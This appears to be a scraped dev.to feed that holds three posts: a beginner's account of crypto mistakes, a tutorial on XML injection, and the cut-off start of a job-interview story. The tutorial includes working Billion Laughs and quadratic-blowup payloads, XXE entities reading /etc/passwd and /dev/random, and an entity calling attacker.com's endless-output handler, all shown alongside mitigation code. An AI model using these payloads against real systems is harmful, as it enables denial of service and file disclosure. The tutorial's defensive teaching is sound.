&lt;p&gt;In the spirit of full disclosure I want to say that I find the whole conglomerate of DeFi, CeFi, Dex, blockchain and whatnot more than confusing. It happens rather regularly that I read an article about crypto which I simply do not understand.&lt;br&gt;The incredible opportunities come at a price of great complexity and this great complexity leads to one thing especially in the beginning ...&lt;/p&gt;

&lt;p&gt;Mistakes.&lt;/p&gt;

&lt;p&gt;Thus I want to give you an overview over the mistakes that I have done or just barely gotten away from.&lt;/p&gt;

&lt;h1&gt;Intransparency of value&lt;/h1&gt;

&lt;p&gt;If you delve deeper the matter of crypto and are not just in it to hold some Bitcoin then you might encounter a situation that is similar to the following:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Good, my 50 Euro have arrived at Binance. First I will buy some BNB. &lt;em&gt;*buys BNB&lt;/em&gt;*&lt;br&gt;Now I want to transfer that to my wallet. *&lt;em&gt;accepts fees and transfers it&lt;/em&gt;*&lt;br&gt;Sweet, next step: I buy some sweet sweet CAKE over at PancakeSwap. '&lt;em&gt;buys CAKE&lt;/em&gt;'&lt;br&gt;Wait, you can by lottery tickets with CAKE? Gimme five! *&lt;em&gt;buys five tickets&lt;/em&gt;*&lt;br&gt;I always wanted to hold billions of coins. Time to buy some OSM *&lt;em&gt;buys a ridiculous amount of OSM&lt;/em&gt;*&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;After this shopping spree you end up with a bunch of numbers in your wallet. My personally, I rather quickly forget the value these numbers actually hold.&lt;/p&gt;

&lt;p&gt;Is a transaction fee of 0.01 BNB much?&lt;br&gt;How much did I really lose when I spend 5 CAKE on lottery tickets and not win anything?&lt;/p&gt;

&lt;p&gt;I especially noticed that I was sometimes reckless with spending crypto because it was so intangible. Lottery tickets for 0.3 CAKE? Count me in! An NFT for 400 KSM? Interesting! (Not an actual investment of mine)&lt;/p&gt;

&lt;p&gt;So my tip here would be the following: Whenever you want to spent some crypto, first ask yourself how much money that actually is. Once you know that, ask yourself whether you really want to go through with the transaction. This is especially true for transactions where you loose your coins, e.g. because you have to pay fees compared to transactions where you gain an equal amount of another coin.&lt;/p&gt;

&lt;h1&gt;Underestimate transaction fees&lt;/h1&gt;

&lt;p&gt;I want to stress the last point because I fell for that trap too often in the short time that I buy crypto. The worst thing is that you do not even immediately notice that you have fallen for it.&lt;br&gt;This is closely connected to the Intransparency of value I have mentioned before. Even though Meta Mask shows you the maximum gas fees, it can be hard to understand what it means.&lt;/p&gt;

&lt;p&gt;This totally leaves aside the fact that it is easy to confuse a 0.0008 with 0.008 and thus you do not even notice that you spent a 10 times higher fee for a transaction.&lt;/p&gt;

&lt;p&gt;Time for a story. It was the first time I traded crypto outside the safe haven that is a broker. I was ready for the wide world that is crypto and started with &lt;a href="https://pancakeswap.finance/"&gt;PancakeSwap&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For some time everything was smooth sailing. I could provide liquidity, I could invest in Syrup pools. Life was filled with syrup-like goodness.&lt;/p&gt;

&lt;p&gt;But dark clouds were forming on the horizon. PancakeSwap has a mechanic where you can claim a bounty which activates the compounding function for the Auto pool. For this interaction you of course have to pay a small fee but simply wait for a bounty that is higher than the gas fees you have to pay. Problem solved&lt;br&gt;Nothing is as tempting as the promise of free money so I tried to claim the bounty … and failed.&lt;/p&gt;

&lt;p&gt;As a side note, it can be really hard or virtually impossible to understand why a transaction failed. Especially in the beginning. In hindsight I think the problem was that Meta Mask was calculating the gas fees incorrectly or the bounty has already been claimed.&lt;/p&gt;

&lt;p&gt;So I did the most natural thing to do in this situation. I kept on trying over and over again. Every time I got the same outcome.&lt;br&gt;At one point I decided to stop. Not because I came too my senses but I made a cruel discovery. For each failed transaction I had to pay gas fees!&lt;/p&gt;

&lt;p&gt;Here an explanation why you have to pay for failed transactions on the ethereum network. I assume&lt;br&gt;that similar arguments also apply to other networks:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The Ethereum network requires gas to execute transactions. When you send tokens, interact with a contract, send ETH, or do anything else on the blockchain, you must pay for that computation. That payment is calculated in gas, and gas is always paid in ETH.&lt;/p&gt;
&lt;p&gt;You are paying for the computation, regardless of whether your transaction succeeds or fails. Even if it fails, the miners must validate and execute your transaction, which takes computational power. You must pay for that computation, just like you would pay for a successful transaction.&lt;br&gt;&lt;/p&gt;
&lt;cite&gt;&lt;p&gt;https://metamask.zendesk.com/hc/en-us/articles/360045439051-Why-did-I-pay-gas-fees-for-a-failed-transaction-&lt;/p&gt;&lt;/cite&gt;
&lt;/blockquote&gt;

&lt;p&gt;In the end I had 6 failed transactions. The most expensive one costed me 0.69$. This is pretty high considering that I was trying to claim a bounty of 0.25$.&lt;/p&gt;

&lt;p&gt;So always make sure you know how much you are paying for gas and if the transaction is not time sensitive then try to postpone it to another time with potentially better gas prices.&lt;/p&gt;

&lt;h1&gt;Unaware of "The others"&lt;/h1&gt;

&lt;p&gt;The internet is full of stories of people who made a ton of money. One smart investment. Getting into this one crypto that no one saw coming early. BOOM! Big returns. Big numbers. Incredible riches.&lt;/p&gt;

&lt;p&gt;If it is not the story of people "having made it" then it is the promise that there is this one particular coin that will blow up soon. It is sooooo good it is only a question of time until it goes to the moon. &lt;br&gt;Side note: People advertising a coin are usually heavily invested in that coin themselves and would therefore profit of other people buying it as well. &lt;/p&gt;

&lt;p&gt;In your head you are already thinking about where the perfect place for the new TV is that you will buy once you have become crypto rich as well. &lt;br&gt;But before you drift too deeply into this crypto dream I want to tell you something about the survivorship bias .&lt;/p&gt;

&lt;p&gt;Let us start with with its definition, it is&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;the logical error of concentrating on the people or things that made it past some selection process and overlooking those that did not, typically because of their lack of visibility. &lt;/p&gt;
&lt;cite&gt;&lt;p&gt;https://en.wikipedia.org/wiki/Survivorship_bias&lt;/p&gt;&lt;/cite&gt;
&lt;/blockquote&gt;

&lt;p&gt;People that lost most of their investment because they put it into "the next big thing" will probably not brag about it on the internet. Maybe because they are ashamed. &lt;/p&gt;

&lt;p&gt;"People will think I am dumb and not as smart as that other guy" might be a thought that is creeping up in their head. &lt;br&gt;Or they are simply too angry and want nothing to have to do with this whole crypto thing.&lt;br&gt;Lastly, you probably do not see these posts because they do not sell as well. They are not getting upvoted and&lt;br&gt;people who run a coin will hardly advertise the post of someone who lost everything with their coin.&lt;/p&gt;

&lt;p&gt;So for starters I would advise you to keep in mind that for everyone who made money with a coin there&lt;br&gt;must be someone who lost money with that coin. This is of course somewhat of an oversimplification but the core holds true.&lt;/p&gt;

&lt;p&gt;We can also address this from another angle. If you have already some investment experience then ask yourself how many of your losses you have talked about on the internet. I would assume that the answer is at least 'Not each one' and probably more along the lines of 'None'.&lt;/p&gt;

&lt;p&gt;A more realistic view would now be to assume this to be true for everyone you come across. Everyone has some investment skeletons in the closet and rich people usually have big closets ...&lt;/p&gt;

&lt;h1&gt;Get rich quick mentality&lt;/h1&gt;

&lt;p&gt;This is an extension of the last point. So lets say that you are aware that people lose money. Not everyone&lt;br&gt;can be a winner. Still you could be one if you just approached it right.&lt;/p&gt;

&lt;p&gt;How could you not want big numbers and prestige for yourself. So you start looking at dirt cheap coins with&lt;br&gt;zero utility and think: "Maybe this is it. Maybe if I invest just a tiny bit then it would not be too bad if the coins goes to zero. Yet it has potential to blow up really big."&lt;/p&gt;

&lt;p&gt;Or you become part of a "pump and dump" community. The people are very nice and they guarantee success. They have done that many times before and everyone in there swears they have been making money.&lt;/p&gt;

&lt;p&gt;For those of you who do not know what those communities do. They coordinate buying a certain coin. This results in an increase in price. Maybe they also spread the news like "XYZ is totally blowing up. You must get in now!"&lt;br&gt;Either way, other people will start noticing the increase in price and will buy as well. That is the moment when the community starts selling the coin to these new buyers for a higher price. Making a profit in the process (and letting those new buyers plunge into their doom).&lt;/p&gt;

&lt;p&gt;In case you are wondering: Yes, this is market manipulation and would have severe consequences in other markets like the stock market for example. But good thing crypto is mostly unregulated. Am I right?&lt;br&gt;Just hope that the community you are in does not have an inner circle. An elitist group that has bought the coin before and then is dumping their coins onto you. Making you the poor fool plunging into his doom.&lt;/p&gt;

&lt;p&gt;I think the point I am trying to make is that a get-rich-quick-mentality makes you vulnerable to scams. Stay away from riskier investments. Even if people claim there is zero risk involved understand this: you get a higher return on your investment the more risk you are willing to take. A high yielding investment without risk does not exist. Here I would like to ignore arbitrage situation for the moment which would be return at zero risk but that is a very special situation.&lt;/p&gt;

&lt;p&gt;Here is my recommendation: In the beginning buy one of those established coins and hold it for a while. Get a feeling for the ups and downs of the crypto market. You can invest in shit coins. But only amounts that you can stomach loosing. Also do not spend all your time researching the next coin that is blowing up. Instead learn more about crypto. Because this world is actually quite fascinating once you look past making quick profit.&lt;/p&gt;

&lt;h1&gt;It always pays to take a second look&lt;/h1&gt;

&lt;p&gt;Let me make that crystal clear: Always make sure you are sending your crypto to the correct adress!&lt;/p&gt;

&lt;p&gt;Picture this: you want to send a noteworthy amount of crypto from one wallet to the other. You have done that before. No big deal!&lt;br&gt;You click send in one wallet and then you wait. But your crypto does not arrive in the other wallet. Nervousness is rising. You decide to check the transaction which luckily you can because a block chain essentially is a vault made out of glass. Comparing the target address from the transaction with you intended target address you realize that one digit is false. Do you know what that means?&lt;/p&gt;

&lt;p&gt;You crypto is gone! With a high probability will this wallet not belong to anyone. Even if it would belong to someone it would be nigh impossible to contact that person.&lt;/p&gt;

&lt;p&gt;I am very grateful that this situation did not yet happen to me. Once I almost thought that I lost my money when trying to transfer SHIB from Binance to my wallet. In the end it turned out that I did not add the correct currency to Meta Mask and that was why it did not show my transferred crypto.&lt;/p&gt;

&lt;p&gt;The take away point: If you intend to send a bigger amount of money or if you do your first transaction to a wallet it might be a good a idea to test it with a small transaction first. Alternatively it could be possible to simulate the transaction on the testnet if that is available for you crypto of choice.&lt;/p&gt;

&lt;h1&gt;Nothing but a speck of dust&lt;/h1&gt;

&lt;p&gt;It is wise to start with small amounts when investing into crypto. This helps to get a feeling for how the markets move.&lt;/p&gt;

&lt;p&gt;But it also comes with the own set of problems. The following two points are more of a word-of-warning, things to be aware about and not concrete tips.&lt;/p&gt;

&lt;h2&gt;The transaction is too small compared to the fees&lt;/h2&gt;

&lt;p&gt;For me, everything started with buying 10 Euros worth of Ethereum. Having this money in my Coinbase wallet was exhilarating. It felt like I was holding a piece of future in my hand. &lt;br&gt;That it until I wanted to move that ETH into my MetaMask wallet and saw that I would have to pay 8 Euros of fees. Guess what! Those ETH stayed with Coinbase for a long time.&lt;/p&gt;

&lt;h2&gt;Your holding amount is to small to do what you want to do&lt;/h2&gt;

&lt;p&gt;It happened to me way to often that I wanted to do a certain transaction but could not do it because it required bigger amounts then I was holding.&lt;/p&gt;

&lt;p&gt;Let me give you an example: I have a some money invested in &lt;a href="https://drip.community/"&gt;Drip&lt;/a&gt; where I get 1% per day on my staked amount. Instead of reinvesting my interest, I claimed it accidentally. When I wanted to reinvest it I couldn't because only investments of more than 1 drip are allowed. So now I have 0.16 Drip lying around and I have no idea what to do with it.&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;There you have it. These are 6 beginner pitfalls that you hopefully can avoid now that you are aware of them. None of those hurt me too much but it either resulted in burning some money or loosing some hair because of the stress they caused me.&lt;/p&gt;

&lt;p&gt;Feel free to share your beginner mistakes with me in the comments and it case that it was not clear already because I was talking about "mistakes", nothing in this article should be seen as investment advice.&lt;/p&gt;

</description>
      <category>crypto</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Web Services Security: XML Injection </title>
      <author>Muhammad Ahmad</author>
      <pubDate>Sat, 07 Aug 2021 15:41:49 +0000</pubDate>
      <link>https://dev.to/0xf10yd/web-services-security-xml-injection-j4d</link>
      <guid>https://dev.to/0xf10yd/web-services-security-xml-injection-j4d</guid>
      <description>&lt;h2&gt;
  &lt;a href="#what-is-xml-definition-and-further-details"&gt;
  &lt;/a&gt;
  What is XML: definition and further details
&lt;/h2&gt;

&lt;p&gt;XML stands for eXtensible Markup Language, a derivative of SGML (upon which HTML is also based) and used to represent structured data objects as human-readable text. XML is designed as a format for the storage and transmission of data. XML is customizable (extensible) so that it can be tailored for any application by defining how data is organized and represented.&lt;/p&gt;

&lt;p&gt;Here's an example of a simple XML file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;
&amp;lt;message&amp;gt;
  &amp;lt;to&amp;gt;receiver&amp;lt;/to&amp;gt;
  &amp;lt;from&amp;gt;sender&amp;lt;/from&amp;gt;
  &amp;lt;body&amp;gt;data&amp;lt;/body&amp;gt;
&amp;lt;/message&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line of the text file identifies the file as an XML document and declares that it is encoded as Unicode “UTF-8” characters. As a best practice, every XML file should begin with such an identification though it's not strictly required.&lt;/p&gt;

&lt;p&gt;All applications should use a standard parser library to consume XML text like this example. The parser converts constructed text file streams into a tree structure representation of the data that abstracts away the syntactic details of the source for the application to process directly. For the example above, an XML parser would create a data structure as shown below:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--z2BL8hy2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/byz94f4alvgx2cmjc48e.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--z2BL8hy2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/byz94f4alvgx2cmjc48e.png" alt="xml ds"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Using the tree structure, software can easily identify the root element (message) and that it is well-formed having the three expected sub-elements, each with its corresponding text value available for processing. &lt;/p&gt;

&lt;p&gt;Applications use XML as a handy data format for all manner of custom data representations, as well as a number of standard formats that are designed on top of XML. Put in mind that when handling any of the following kinds of data (and many more than can be listed here, as well) that under the covers an XML parser is likely running and hence these security issues may very well apply.&lt;/p&gt;

&lt;p&gt;As well, there're many other data formats that are based on XML including but not limited to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SOAP&lt;/li&gt;
&lt;li&gt;.NET configuration files&lt;/li&gt;
&lt;li&gt;Websphere trace files&lt;/li&gt;
&lt;li&gt;WDSL&lt;/li&gt;
&lt;li&gt;RSS&lt;/li&gt;
&lt;li&gt;SVG&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#xml-injection-attacks-common-types"&gt;
  &lt;/a&gt;
  XML Injection Attacks: Common Types
&lt;/h2&gt;

&lt;p&gt;The following attacks described are applicable to any application that parses XML input.&lt;br&gt;
Specifically, the attacker creates malformed XML that the application consumes with the intention of tricking the XML parser to cause some harmful action.&lt;br&gt;
XML parsers with bugs, or that are misconfigured and hence vulnerable to manipulation, are generally susceptible to two kinds of attacks: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;XML Bombs (Billion laughs attack): The XML parser may crash or execute incorrectly given certain input data, resulting in a Denial of Service attack.&lt;/li&gt;
&lt;li&gt;XXE Disclosure (XML external entity): The XML parser may mistakenly leak sensitive information.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;Keep in mind that attacks may utilize perfectly valid XML, or possibly malformed XML (unless the parser strictly detects and rejects it safely).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;
  &lt;a href="#xml-bomb-attack"&gt;
  &lt;/a&gt;
  XML Bomb Attack
&lt;/h3&gt;

&lt;p&gt;An XML Bomb may be valid XML, but is designed so as to cause the XML parser, or the application processing its output, to hang or crash executing.&lt;br&gt;
For example, consider the Billion Laughs Attack that consists of a short XML file that manages to expand under XML parsing into some 3 gigabytes of data. The large resultant data typically crashes any application, and it is easy to see how the data size could be scaled arbitrarily larger.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;?xml version="1.0"?&amp;gt;
&amp;lt;!DOCTYPE lolz [
&amp;lt;!ENTITY lol "lol"&amp;gt;
  &amp;lt;!ENTITY lol2 "&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;"&amp;gt;
  &amp;lt;!ENTITY lol3 "&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;"&amp;gt;
  &amp;lt;!ENTITY lol4 "&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;"&amp;gt;
  &amp;lt;!ENTITY lol5 "&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;"&amp;gt;
  &amp;lt;!ENTITY lol6 "&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;"&amp;gt;
  &amp;lt;!ENTITY lol7 "&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;"&amp;gt;
  &amp;lt;!ENTITY lol8 "&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;"&amp;gt;
  &amp;lt;!ENTITY lol9 "&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;"&amp;gt;
]&amp;gt;
&amp;lt;lolz&amp;gt;&amp;amp;lol9;&amp;lt;/lolz&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Another example of a similar attack is the Quadratic Blowup Attack, which can also quickly expand to 2.5 gigabytes. &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The “...” symbol replaces more repetitions below.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;?xml version="1.0"?&amp;gt;
&amp;lt;!DOCTYPE kaboom [
  &amp;lt;!ENTITY a "aaaaaaaaaaaaaaaaaa..."&amp;gt;
]&amp;gt;
&amp;lt;kaboom&amp;gt;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;...&amp;lt;/kaboom&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#mitigating-xml-bombs"&gt;
  &lt;/a&gt;
  Mitigating XML Bombs
&lt;/h3&gt;

&lt;p&gt;The best way to avoid XML Bombs is for the application to configure the XML parser to disable inline expansion of entities. Without inline expansion the size increase will not be available to the attacker and these attacks will be rendered harmless.&lt;br&gt;
When the application requires entity expansion, or if the XML parser does not provide this configuration option, set the parser to enforce a limit on the size of expanded entities.&lt;br&gt;
Here is sample code for the standard .NET 4.0 XML parser to disable inline DTDs:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
XmlReader reader = XmlReader.Create(stream, settings);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;With this configuration, either of the XML Bombs would not result in excessive memory consumption.&lt;br&gt;
Instead of the gigabytes of data, the data structure would show the structure of the entity expansion as it is expressed in the source XML.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If the application needed the expanded form of the relevant entity it would have to construct it directly and in the process have the appropriate checks to avoid causing the Denial of Service itself.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the entity size limited, if an XML Bomb were parsed it would exceed this limit and the XML parser would throw an exception instead of causing a Denial of Service. Naturally, the limit must be set such that it does not impair useful functionality of valid uses.&lt;br&gt;
Here's an example in Ruby's REXML parser:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;REXML::Document.entity_expansion_limit = 0
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;No entity expansion will be permitted with this configuration since the resulting size would exceed zero.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#xml-external-entity-xxe-attacks"&gt;
  &lt;/a&gt;
  XML External Entity (XXE) Attacks
&lt;/h2&gt;

&lt;p&gt;One feature of XML that can be used to attack an application is the external entity. By providing an XML input containing a reference to an external entity an attacker can cause the XML parser to read the referenced data and process it into the resultant XML data. The XML External Entity is a way for values replacement to be pulled from external URIs so it can potentially access files as well as network resources. If there is a pathway to expose the resulting data the attacker can manage to ex-filtrate the data by exploiting the access privileges of the XML parser process. Alternatively, by referencing a very large data source this can also lead to Denial of Service.&lt;/p&gt;

&lt;p&gt;For example, consider an XML input that references the file /dev/random, a file stream of pseudorandom bytes that is endless (specifically, successive reading of random bytes will block when the system entropy pool is drained, resupplying more data when entropy is built back up). Since an XML parser will read data from the external entity until end-of-file, it will endlessly consume and construct data eventually overloading the system to failure.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///dev/random" &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;An example of information disclosure could be an XML input that references the file /etc/passwd, the file of user logon information in classic Unix systems. &lt;br&gt;
Modern systems no longer store password information but this file potentially contains user names and private contact information.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the following example, we see how an attacker can achieve Denial of Service through an XXE attack. In this case, the XXE entity is replaced by the result of executing dos.ashx. As we can see below, the dos.ashx program produces output in an infinite loop, so the XXE entity will keep growing indefinitely. &lt;br&gt;
If, in addition to that infinite loop, an attacker manages to execute the program dos.ashx on another machine, then the DoS will affect that machine as well.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ASHX file extension is an ASP.NET Web Handler file that often holds references to other web pages used in an ASP.NET web server application.&lt;br&gt;
&lt;/p&gt;


&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "http://www.attacker.com/dos.ashx" &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// dos.ashx
public void ProcessRequest(HttpContext context) {
  context.Response.ContentType = "text/plain";
  byte[] data = new byte[1000000];

  for (int i = 0; i&amp;lt;data.Length; i++)
    data[i] = (byte)’A’;
  while (true) {
    context.Response.OutputStream.Write(data, 0, data.Length);
    context.Response.Flush();
  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#mitigating-xxe-attacks"&gt;
  &lt;/a&gt;
  Mitigating XXE Attacks
&lt;/h3&gt;

&lt;p&gt;The easiest way is to configure the XML parser to avoid resolving external references entirely, here two examples in .Net 4.0 and PHP:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;XmlReaderSettings settings = new XmlReaderSettings();
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;libxml_disable_entity_loader(true);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Of course, XML external entities can be useful or even essential, in which case completely disabling the feature is not an acceptable solution. In these cases consider configuring, or if necessary, modifying the XML parser in order to apply one or more of these strategies:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Enforce a timeout to prevent delaying or very large data volume attacks.&lt;/li&gt;
&lt;li&gt;Limit the type and amount of data that can be retrieved.&lt;/li&gt;
&lt;li&gt;Restrict the XmlResolver from retrieving resources on the local host.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion:
&lt;/h2&gt;

&lt;p&gt;XML attacks happen when an application that parses specially-crafted XML input causes harm. &lt;br&gt;
Two well-known attacks are XML Bombs (Denial of Service), and XXE or XML External Entity (information disclosure or Denial of Service).&lt;br&gt;
The preferred mitigation is the configuration of the XML parser to disable or at least safely limit the features of XML that cause these problems as described above. When configuration is not sufficient, the XML parser needs modification but this is a more risky and labor intensive method.&lt;/p&gt;

</description>
      <category>security</category>
      <category>webdev</category>
      <category>xml</category>
    </item>
    <item>
      <title>Unacademy Software Engineer interview experience, Web</title>
      <author>Kushagra Mehta</author>
      <pubDate>Sat, 07 Aug 2021 15:33:19 +0000</pubDate>
      <link>https://dev.to/kushagra_mehta/unacademy-software-engineer-interview-experience-web-14d4</link>
      <guid>https://dev.to/kushagra_mehta/unacademy-software-engineer-interview-experience-web-14d4</guid>
      <description>&lt;p&gt;Hello everyone,&lt;br&gt;
I'm Kushagra Mehta, a final year student from Jaipur. I have joined Unacademy as a Software Engineer. In today's blog, I'll be sharing my interview experience at Unacademy for a Software Engineer position.&lt;br&gt;
&lt;a href="https://i.giphy.com/media/Kx8BFbGTiW95FDnUR3/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/Kx8BFbGTiW95FDnUR3/giphy.gif" alt="Unacademy-logo"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Big shoutout to &lt;a href="https://www.linkedin.com/in/rajatetc/"&gt;Rajat Gupta&lt;/a&gt; who, wrote a great Interview experience article that helps me along the way. &lt;a href="https://rajatgupta.xyz/unacademy-interview"&gt;Link🔗&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#how-it-started"&gt;
  &lt;/a&gt;
  How it started?
&lt;/h2&gt;

&lt;p&gt;Hmm, This is an interesting one. From my side, I did some cold-DM's in mid of Jun-21 asking for interviews(&lt;a href="https://www.youtube.com/watch?v=_wQGd6Crkaw&amp;amp;list=PLLbfvOX935JELl4VMj-Sao382KYNJctly&amp;amp;index=28"&gt;&lt;em&gt;Great videos on it&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Then on the sweet morning of 13-Jul, I got a call from HR team of Unacademy asking that, Was I available for an interview or not. From here, my journey started, So the call goes like this&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;** &lt;strong&gt;Basic introduction&lt;/strong&gt; **&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;HR&lt;/strong&gt;: &lt;em&gt;Can you tell me something about yourself&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Me&lt;/strong&gt;: &lt;em&gt;I'm kushagra.....&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;HR&lt;/strong&gt;: &lt;em&gt;Awsome man&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Me&lt;/strong&gt;: 😳 &lt;strong&gt;OK.!!&lt;/strong&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;HR&lt;/strong&gt;: &lt;em&gt;Let's schedule a call for your next round&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Me&lt;/strong&gt;: 😮 &lt;em&gt;Why not&lt;/em&gt; (Inside me:- Am I dreaming or what 😶)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The recruiter explained everything related to the next rounds over the call and scheduled the first round.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I asked my recruiter where he got my profile from, he said he liked my &lt;a href="https://www.linkedin.com/in/kushagra-mehta-/"&gt;LinkedIn&lt;/a&gt; &amp;amp; &lt;a href="https://github.com/KushagraMehta/"&gt;Github&lt;/a&gt; profile and that's why he reached out to me. So boys and girls it's time to improve your online profiles.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#interview-rounds"&gt;
  &lt;/a&gt;
  Interview rounds✨
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;JS Fundamentals (~ 1 hr)&lt;/li&gt;
